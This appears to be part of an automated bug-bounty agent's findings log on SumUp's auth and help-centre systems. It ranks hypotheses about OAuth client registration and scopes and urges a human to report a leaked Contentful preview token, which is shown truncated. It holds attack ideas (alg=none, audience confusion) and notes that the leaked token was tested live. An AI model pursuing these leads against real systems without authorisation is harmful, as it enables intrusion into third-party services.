+impact: Unauthenticated read of 679 unpublished entries / 103 draft articles / 49 unpublished assets (P4, read-only, space-bounded).
+testability: HUMAN_ONLY
+
+[HYP] Staging dynamic-client registration sync to prod auth.sumup.com trust store
+class: OATH
+asset: auth.sam-app.ro/oauth2/register
+confidence: 55
+reasoning: Staging mints valid empty-scope JWTs via client_credentials; JWKS kid isolation proven (prod 8 vs staging 11 keys, ZERO overlap); client-level sync to prod provenance DB untested. Requires POST register (passive-only rule blocks).
+evidence_needed: Fresh staging client_id presented to prod authorize/token endpoints.
+verify_steps: BLOCKED — needs POST /oauth2/register on staging; not passive.
+impact: Attacker-controlled client on prod if synced — Low-now/latent-high.
+testability: AUTH_HELPED
+
+[HYP] `support_centre` "classic" scope maps to undeclared legacy resource model
+class: OATH
+asset: auth.sumup.com/oauth2/auth?client_id=support_centre
+confidence: 45
+reasoning: "classic" scope in OIDC discovery, absent from dashboard catalog; adding dashboard-only scopes to support_centre → invalid_scope; distinct scope model. No passive path to enumerate "classic" grants without authenticated code exchange.
+evidence_needed: Authorization code from real help.sumup.com session, or request_object grant discovery.
+verify_steps: PASSIVE done (302→login_challenge); next requires authenticated interaction.
+impact: Potential broader-scope session on first-party client; P5-informational.
+testability: AUTH_HELPED
+
+**STEP 4 — SELF-CRITIQUE**
+- [PARKED] OAuth "none" auth_method + PAR + alg=none: print-side-oracle exhausted, requires valid PAR flow with registered client — AUTH_HELPED.
+- [PARKED] RFC 9728 token validation (aud confusion): requires valid merchant token — AUTH_HELPED.
+- [PARKED] ccTLD/crt.sh legacy callback enumeration: exhaustively negative (0 HITs) — closed.
+- [FINAL] 1. Contentful Preview token leak (conf 95) — SURVIVES, PASSIVE, IMMEDIATELY REPORTABLE, report on disk.
+- [FINAL] 2. Staging dynamic client registration cross-env sync (conf 55) — SURVIVES, AUTH_HELPED.
+- [FINAL] 3. `support_centre` classic-scope model (conf 45) — SURVIVES, AUTH_HELPED/informational.
+
+**STEP 5 — NEXT ACTION**
+[NEXT] HUMAN: **SUBMIT NOW** — Open https://bugs-olivermaicher.atlassian.net/jira/software/form/563ad9fc-8e82-41f1-bab4-2396b07d47b9 and paste `reports/contentful-preview-token-leak.md` (3,869 bytes, on disk this cycle — no longer a KB phantom). Token `XRP4rB5w…` verified LIVE 2026-09-11 (sha256 `52136da5…8997`, preview 9,543 vs CDN 8,864; 103 draft articles; 49 unpublished assets). Submit before rotation.
+
+**STEP 6 — LEARNING**
+- [LEARN] REJECTED MISCONFIG @ help.sumup.com: Prior "token CFPAT-52136…" literals were the sha256 mislabeled as a token; the real leaked token is `XRP4rB5w…` whose sha256 IS `52136da5…8997` — token never rotated, still authenticates (200 preview), this cycle's report file is the genuine artifact.
+- [LEARN] ACCEPTED MISCONFIG @ help.sumup.com: Report file now truly on disk (3,869 bytes, 2026-09-11) with current counts preview 9,543/CDN 8,864 entries, 882/779 articles (103 draft), 677/628 assets (49 unpublished); environments 404 re-confirms space-bounded scope.
+- [LEARN] REJECTED OATH @ preview.contentful.com: buildId absence-of-token heuristic unreliable (older chunk still served); token-validity probing via direct API is the only ground truth.
+
+**STEP 7 — RISK**
+[RISK] sumup: 82 — Contentful PREVIEW token leak is LIVE-today and reportable; the single binding constraint was the report file, which now genuinely exists on disk → submission is the only remaining action this cycle. Higher-impact chains (staging client sync, OAuth alg=none, RFC 9728 aud validation, support_centre classic scope) all remain AUTH_HELPED pending a merchant OAuth token, and no new passive surface emerged since the callback-host enumeration closure.
